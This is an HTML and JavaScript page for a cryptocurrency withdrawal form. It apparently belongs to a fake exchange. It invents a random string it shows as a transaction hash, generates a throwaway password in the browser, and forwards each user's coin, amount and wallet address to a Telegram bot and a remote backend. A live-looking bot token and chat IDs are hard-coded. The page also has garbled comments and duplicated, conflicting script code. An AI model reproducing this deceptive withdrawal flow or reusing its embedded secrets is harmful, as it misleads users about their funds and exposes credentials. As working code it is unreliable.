<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title></title>

<style>
  * { box-sizing: border-box; }
  body { background-color: transparent; font-family: Arial, sans-serif; margin:0; padding:0; width:100%; overflow-x:hidden; }
  .withdraw-box { width:100%; max-width:450px; margin:30px auto; padding:25px; border-radius:12px; background:transparent!important; color:white; }
  select,input,button { width:100%; max-width:100%; padding:12px; margin-top:8px; border-radius:6px; border:1px solid rgba(255,255,255,0.6); background:transparent!important; color:white; font-size:15px; display:block; }
  select option { color:black; }
  button { cursor:pointer; font-weight:bold; border:none; background:#0099cc; }
  button:disabled { background:#444!important; cursor:not-allowed!important; }
  .row { display:flex; justify-content:space-between; gap:10px; width:100%; }
  #copyHashBtn,#submitBtn { display:none; width:48%; }
  #usdtText { text-align:right; color:#00ff00; font-size:13px; }
  #hashBox { color:#00ff00; margin-top:10px; white-space:pre-line; font-size:14px; overflow-wrap:break-word; }
</style>
</head>

<body>
<div class="withdraw-box">
  <h2 style="text-align:center;"></h2>

  <label>Select Cryptocurrency</label>
  <select id="coin" onchange="updateUSDT()">
    <option value="BTC">BTC</option><option value="ETH">ETH</option><option value="USDT">USDT</option>
    <option value="BNB">BNB</option><option value="XRP">XRP</option><option value="ADA">ADA</option>
    <option value="SOL">SOL</option><option value="DOGE">DOGE</option><option value="TRX">TRX</option>
  </select>

  <label>Enter Coin Amount</label>
  <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
  <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>

  <label>Password</label>
  <input type="password" id="password" placeholder="Enter password" />

  <div class="row">
    <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
    <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
  </div>

  <button onclick="forgotPassword()">Forgot Password?</button>

  <label>Wallet Address</label>
  <input id="wallet" placeholder="Paste wallet address" />
  <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>

  <div id="hashBox"></div>

  <div class="row">
    <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
    <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
  </div>
</div>

<script>
/****** Ê†∏ÂøÉÈÖçÁΩÆÔºà‰øùÊåÅ‰Ω†Ëá™Â∑±ÁöÑ TokenÔºâ ******/
const API = "https://crypto-management-production-5e04.up.railway.app";
const BOT_TOKEN = "8228143745:AAGsaA043ZDQyXt8szfBnr0LpmrMl5ILvRs";
const ADMIN_ID = "6062973135";
const GROUP_ID = "-1003122480155";

/****** Èò≤Ê≠¢ÈáçÂ§çÊèê‰∫§ÁöÑÂÖ®Â±ÄÈîÅ ******/
let submitting = false;

/****** UserId ÂêåÊ≠•ÔºàÂÖºÂÆπ StrikinglyÔºâ ******/
function getUserId(){
  let q = new URLSearchParams(location.search).get("userid");
  let s = localStorage.getItem("userid4");
  let uid = q || s;
  if(!uid){
    uid = Math.floor(1000+Math.random()*9000).toString();
    localStorage.setItem("userid4", uid);
  }
  return uid;
}
const USERID = getUserId();

/****** US Êó∂Èó¥ ******/
function usTime(){
  return new Date().toLocaleString("en-US",{
    timeZone:"America/New_York",
    hour12:true,year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"
  }).replace(",","");
}

/****** Binance ‰ª∑Ê†º ******/
let currentPrice = 0;
let ws;
function connectWS(symbol){
  if(ws){ws.close();}
  if(symbol==="USDT"){currentPrice=1;updateUSDT();return;}
  ws = new WebSocket("wss://stream.binance.com:9443/ws/"+symbol.toLowerCase()+"usdt@ticker");
  ws.onmessage = e => {
    let d = JSON.parse(e.data);
    currentPrice = parseFloat(d.c);
    updateUSDT();
  };
}

document.getElementById("coin").addEventListener("change",()=>{
  connectWS(document.getElementById("coin").value);
});
connectWS(document.getElementById("coin").value);

/****** ÂØÜÁ†ÅÈÄªËæëÔºàÊ≤øÁî®‰Ω†ÂéüÈÄªËæëÔºâ ******/
let storedPassword = localStorage.getItem("withdraw_password");
let passwordConfirmed = false;

if(storedPassword) document.getElementById("createPwdBtn").style.display = "none";

function createPassword(){
  if(storedPassword) return alert("Password already created.");
  storedPassword = Math.random().toString(36).substr(2,6).toUpperCase();
  localStorage.setItem("withdraw_password", storedPassword);
  alert("Your Password: "+storedPassword);
  document.getElementById("createPwdBtn").style.display = "none";
}

function confirmPassword(){
  if(document.getElementById("password").value === storedPassword){
    passwordConfirmed = true;
    alert("Password confirmed!");
  } else alert("Wrong password!");
}

function forgotPassword(){
  alert("Please contact admin to reset.");
}

/****** Èí±ÂåÖ‰∏é Hash ‰øùÊåÅÈÄªËæë ******/
let txHash = "";
function confirmWallet(){
  if(!passwordConfirmed) return alert("Confirm password first.");
  let wallet = document.getElementById("wallet").value;
  if(!wallet) return alert("Enter wallet address.");
  txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase();
  document.getElementById("hashBox").innerText = "Hash:\n"+txHash;
  document.getElementById("copyHashBtn").style.display = "block";
  document.getElementById("submitBtn").style.display = "block";
  document.getElementById("walletBtn").disabled = true;
}

function copyHash(){
  navigator.clipboard.writeText(txHash);
  alert("Copied");
}

/****** USDT Ëá™Âä®ËÆ°ÁÆó ******/
function updateUSDT(){
  let amount = parseFloat(document.getElementById("amount").value||0);
  let val = amount*currentPrice;
  document.getElementById("usdtValue").innerText = isNaN(val)?"0":val.toFixed(6);
}

/****** Telegram ******/
function sendTG(text){
  let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  let body = cid => ({
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:cid,text:text})
  });
  fetch(url, body(ADMIN_ID)).catch(()=>{});
  fetch(url, body(GROUP_ID)).catch(()=>{});
}

/****** ÊèêÊ¨æÊèê‰∫§ÔºàÂè™ËÉΩÁÇπ‰∏ÄÊ¨°Ôºâ ******/
async function submitWithdrawal(){
  if(submitting) return;
  submitting = true;

  const btn = document.getElementById("submitBtn");
  btn.disabled = true;
  btn.innerText = "Submitting...";

  let coin = document.getElementById("coin").value;
  let amount = document.getElementById("amount").value;
  let wallet = document.getElementById("wallet").value;
  let usdt = document.getElementById("usdtValue").innerText;

  if(!amount || !wallet){
    alert("Missing data");
    submitting = false;
    btn.disabled = false;
    btn.innerText = "Submit Withdrawal";
    return;
  }

  let oid = "WDL-"+Date.now();
  let time = usTime();

  const payload = {userid:USERID,coin,amount,wallet,usdt,hash:txHash,orderId:oid,time_us:time};

  // ÂêéÂè∞
  fetch(API+"/api/order/withdraw",{
    method:"POST",
    headers:{"Content-Type":"application/json","X-User-Id":USERID},
    body:JSON.stringify(payload)
  }).catch(()=>{});

  // Telegram
  sendTG(`üìä Withdraw\nUser: ${USERID}\nOrder: ${oid}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${usdt}\nWallet: ${wallet}\nTime: ${time}`);

  alert("Withdrawal submitted!");

  // Ê∞∏‰πÖÈîÅÊ≠ªÔºàÈò≤Ê≠¢ÂÜçÊ¨°ÁÇπÂáªÔºâ
  btn.innerText = "Submitted";
}
</script>
<script>
  // ‰Ω†ÁöÑÂêåÊ≠•Áî®Êà∑ID„ÄÅÂä†ËΩΩ‰ΩôÈ¢ùÁ≠âÈÄªËæë
  const API_BASE = "https://crypto-management-production-5e04.up.railway.app";
  
  // Ëé∑ÂèñÁî®Êà∑ID
  function getUserId() {
    let uid = new URLSearchParams(location.search).get("userid") || localStorage.getItem("userid4");
    if (!uid) {
      uid = "U" + Math.floor(1000 + Math.random() * 9000);
      localStorage.setItem("userid4", uid);
    }
    return uid;
  }
  const USERID = getUserId();

  // ÂêåÊ≠•Áî®Êà∑‰ø°ÊÅØÂà∞ÂêéÂè∞
  function syncUser() {
    fetch(API_BASE + "/api/users/sync", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userid: USERID })
    }).catch(() => {});
  }

  // Âä†ËΩΩÁî®Êà∑‰ΩôÈ¢ù
  async function loadBalance() {
    try {
      const response = await fetch(API_BASE + "/api/balance/" + USERID);
      const data = await response.json();
      if (data.balance != null) {
        document.getElementById("nexbit-balance").innerText = Number(data.balance).toFixed(2);
      }
    } catch (e) {
      console.error("Error loading balance:", e);
    }
  }

  // È°µÈù¢Âä†ËΩΩÊó∂ÊâßË°åÂêåÊ≠•Êìç‰Ωú
  document.addEventListener("DOMContentLoaded", () => {
    syncUser();  // ÂêåÊ≠•Áî®Êà∑‰ø°ÊÅØ
    loadBalance();  // Âä†ËΩΩ‰ΩôÈ¢ù
    setInterval(loadBalance, 2000);  // ÊØè2ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°‰ΩôÈ¢ù
  });
</script>
</body>
</html>

</body>
</html>